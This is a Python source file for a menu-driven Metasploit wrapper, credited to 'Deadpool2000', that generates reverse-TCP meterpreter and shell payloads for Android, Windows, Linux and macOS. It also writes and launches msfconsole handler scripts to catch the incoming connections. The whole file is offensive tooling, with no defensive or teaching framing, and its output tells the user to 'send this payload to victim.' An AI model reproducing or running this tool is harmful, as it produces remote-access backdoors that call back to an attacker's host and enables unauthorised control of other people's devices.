import os
try:
    # Color code
    R='\033[91m'
    Y='\033[93m'
    G='\033[92m'
    CY='\033[96m'
    W='\033[97m'
    B='\033[95m'
    print(CY+"""
    ____              __               
   / __ \____ ___  __/ /_  ____ _____ _
  / /_/ / __ `/ / / / __ \/ __ `/ __ `/
 / ____/ /_/ / /_/ / /_/ / /_/ / /_/ / 
/_/    \__,_/\__, /_.___/\__,_/\__, /  
            /____/            /____/   
"""+G+"""

>> Payload generator for Metasploit <<""")
    def main():
        print(R+"""
************************************************"""+CY+"""\n
>>> Main menu"""+Y+"""

1) Create a payload
2) Start handler
3) Launch Metasploit
4) Exit\n""")

    def osi():
        print(R+"""
************************************************"""+Y+"""
            
Select option to create payload\n"""+CY+"""
1) Android
2) Windows
3) Linux
4) Mac OS

99) Back to main menu\n""")

    def lst():
        print(R+"""
************************************************"""+Y+"""

Select option to create handler\n"""+CY+"""
1) Android
2) Windows
3) Linux
4) Mac OS

99) Back to main menu\n""")
        
    def check():
        try:
            os.remove('msh.rc')
        except FileNotFoundError:
            print("")
        if os.path.isfile("payload/test.txt")==True:
            os.remove("payload/test.txt")
    def check2():
        if os.path.isfile('/data/data/com.termux/files/usr/bin/bash')==False:
            if os.path.isfile('/usr/bin/msfconsole')==False:
                print(R+"""
************************************************\n"""
+Y+"\nmsfconsole not found ! Please install Meatsploit-Framework properly and try again :( \n"+W)
                exit(0)
    def ch3():
        if os.path.isfile('/data/data/com.termux/files/usr/bin/bash')==True:
            if os.path.isfile('/data/data/com.termux/files/usr/bin/msfvenom')==False:
                print(R+"""
************************************************\n"""
+Y+"\nmsfconsole and msfvenom not found in '/data/data/com.termux/files/usr/bin/'\nPlease install Meatsploit-Framework properly and try again :( \n"+W)
                exit(0)
            else:
                print("")
    def sel():
        c=int(input(G+"Select your choice >>"+W+" "))
        # Create payload
        if c==1:
            def sel1():
                ch=int(input(G+"Select your choice >>"+W+" "))
                if ch==1:
                    lh=input(CY+"\nEnter LHOST:"+W+" ")
                    lp=int(input(CY+"Enter LPORT:"+W+" "))
                    print(B+"\nGernerating payload..........\n")
                    st="msfvenom -p android/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/payload.apk"
                    os.system(st)
                    print(R+"\n>>>"+G+" Payload saved as "+Y+'payload.apk'+G+" in 'payload' folder"+R+" <<<\n")
                    print(CY+"Now send this payload to victim. Then start 'handler' from main menu\n")
                    osi()
                    sel1()
                elif ch==2:
                    lh=input(CY+"\nEnter LHOST:"+W+" ")
                    lp=int(input(CY+"Enter LPORT:"+W+" "))
                    print(B+"\nGernerating payload..........\n")
                    st="msfvenom -p windows/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/payload.exe"
                    os.system(st)
                    print(R+"\n>>>"+G+" Payload saved as "+Y+'payload.exe'+G+" in 'payload' folder"+R+" <<<\n")
                    print(CY+"Now send this payload to victim. Then start 'handler' from main menu\n")
                    osi()
                    sel1()
                elif ch==3:
                    lh=input(CY+"\nEnter LHOST:"+W+" ")
                    lp=int(input(CY+"Enter LPORT:"+W+" "))
                    print(B+"\nGernerating payload..........\n")
                    st="msfvenom -p linux/x86/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/payload.elf"
                    os.system(st)
                    print(R+"\n>>>"+G+" Payload saved as "+Y+'payload.elf'+G+" in 'payload' folder"+R+" <<<\n")
                    print(CY+"Now send this payload to victim. Then start 'handler' from main menu\n")
                    osi()
                    sel1()
                elif ch==4:
                    lh=input(CY+"\nEnter LHOST:"+W+" ")
                    lp=int(input(CY+"Enter LPORT:"+W+" "))
                    print(B+"\nGernerating payload..........\n")
                    st="msfvenom -p osx/x86/shell_reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/payload.macho"
                    os.system(st)
                    print(R+"\n>>>"+G+" Payload saved as "+Y+'payload.macho'+G+" in 'payload' folder"+R+" <<<\n")
                    print(CY+"Now send this payload to victim. Then start 'handler' from main menu\n")
                    osi()
                    sel1()
                elif ch==99:
                    main()
                    sel()
                else:
                    print(R+"\nInvalid Choice! Please try again\n")
                    osi()
                    sel1()
            osi()
            sel1()
        elif c==2:
            # Creating handler
            def sel2():
                ch=int(input(G+"Select your choice >>"+W+" "))
                if ch==1:
                    pr=os.path.isfile("msh.rc")
                    if pr:
                        try:
                            os.remove('msh.rc')
                        except FileNotFoundError:
                            print("")
                    else:                
                        lh=input(CY+"\nEnter LHOST:"+W+" ")
                        lp=int(input(CY+"Enter LPORT:"+W+" "))
                        f=open("msh.rc","w+")
                        l1="use exploit/multi/handler"
                        l2="set PAYLOAD android/meterpreter/reverse_tcp"
                        l3="set LHOST "+str(lh)
                        l4="set LPORT "+str(lp)
                        l5="set ExitOnSession false"
                        l6="exploit -j -z"
                        f.write("%s\n%s\n%s\n%s\n%s\n%s\n" %(l1,l2,l3,l4,l5,l6))
                        f.close()
                    os.system('clear')
                    print(Y+"\nStarting handler...............\n"+W)
                    os.system("msfconsole -r msh.rc")
                    os.remove('msh.rc')
                    os.system("clear")                      
                    lst()
                    sel2()
                elif ch==2:
                    pr=os.path.isfile('msh.rc')
                    if pr:
                        try:
                            os.remove('msh.rc')
                        except FileNotFoundError:
                            print("")
                    else:                
                        lh=input(CY+"\nEnter LHOST:"+W+" ")
                        lp=int(input(CY+"Enter LPORT:"+W+" "))
                        f=open("msh.rc","w+")
                        l1="use exploit/multi/handler"
                        l2="set PAYLOAD windows/meterpreter/reverse_tcp"
                        l3="set LHOST "+str(lh)
                        l4="set LPORT "+str(lp)
                        l5="set ExitOnSession false"
                        l6="exploit -j -z"
                        f.write("%s\n%s\n%s\n%s\n%s\n%s\n" %(l1,l2,l3,l4,l5,l6))
                        f.close()
                    os.system('clear')
                    print(Y+"\nStarting handler...............\n"+W)
                    os.system("msfconsole -r msh.rc")
                    os.remove('msh.rc')
                    os.system('clear')
                    lst()
                    sel2()
                elif ch==3:
                    pr=os.path.isfile('msh.rc')
                    if pr:
                        try:
                            os.remove('msh.rc')
                        except FileNotFoundError:
                            print("")
                    else:                
                        lh=input(CY+"\nEnter LHOST:"+W+" ")
                        lp=int(input(CY+"Enter LPORT:"+W+" "))
                        f=open("msh.rc","w+")
                        l1="use exploit/multi/handler"
                        l2="set PAYLOAD linux/x86/meterpreter/reverse_tcp"
                        l3="set LHOST "+str(lh)
                        l4="set LPORT "+str(lp)
                        l5="set ExitOnSession false"
                        l6="exploit -j -z"
                        f.write("%s\n%s\n%s\n%s\n%s\n%s\n" %(l1,l2,l3,l4,l5,l6))
                        f.close()
                    os.system('clear')
                    print(Y+"\nStarting handler...............\n"+W)
                    os.system("msfconsole -r msh.rc")
                    os.remove('msh.rc')
                    os.system('clear')
                    lst()
                    sel2()
                elif ch==4:
                    pr=os.path.isfile('msh.rc')
                    if pr:
                        try:
                            os.remove('msh.rc')
                        except FileNotFoundError:
                            print("")
                    else:                
                        lh=input(CY+"\nEnter LHOST:"+W+" ")
                        lp=int(input(CY+"Enter LPORT:"+W+" "))
                        f=open("msh.rc","w+")
                        l1="use exploit/multi/handler"
                        l2="set PAYLOAD osx/x86/shell_reverse_tcp"
                        l3="set LHOST "+str(lh)
                        l4="set LPORT "+str(lp)
                        l5="set ExitOnSession false"
                        l6="exploit -j -z"
                        f.write("%s\n%s\n%s\n%s\n%s\n%s\n" %(l1,l2,l3,l4,l5,l6))
                        f.close()
                    os.system('clear')
                    print(Y+"\nStarting handler...............\n"+W)
                    os.system("msfconsole -r msh.rc")
                    os.remove('msh.rc')
                    os.system('clear')
                    lst()
                    sel2()
                elif ch==99:
                    try:
                        os.remove('msh.rc')
                    except FileNotFoundError:
                        print("")
                    main()
                    sel()
                else:
                    try:
                        os.remove('msh.rc')
                    except FileNotFoundError:
                        print("")
                    print(R+"\nInvalid choice! Please try again\n")
                    lst()
                    sel2()                
            lst()
            sel2()
        elif c==3:
            # Launching msfconsole
            os.system('clear')
            print(Y+"\nLaunching msfconsole..................\n\n"+W)
            os.system("msfconsole")
            os.system('clear')
            main()
            sel()
        elif c==4:
            try:
                os.remove('msh.rc')
            except FileNotFoundError:
                print("")
            print(Y+"\nExit.........! Have a nice day :) ")
            print(R+"\n------------"+CY+" Code by:"+G+" Deadpool2000"+R+" ------------\n"+W)

        else:
            print(R+"\nInvalid choice ! Please try again :(\n")
            try:
                os.remove('msh.rc')
            except FileNotFoundError:
                print("")
            main()                
            sel()
    check()
    check2()
    ch3()
    main()                
    sel()
except KeyboardInterrupt:
    try:
        os.remove('msh.rc')
    except FileNotFoundError:
        print("")
    print(CY+"""\n
************************************************"""+G+
"\n\n>>> "+R+"Interrupted!"+Y+" Exiting.........\n"+W)
    print(R+"\n------------"+CY+" Code by:"+G+" Deadpool2000"+R+" ------------\n"+W)
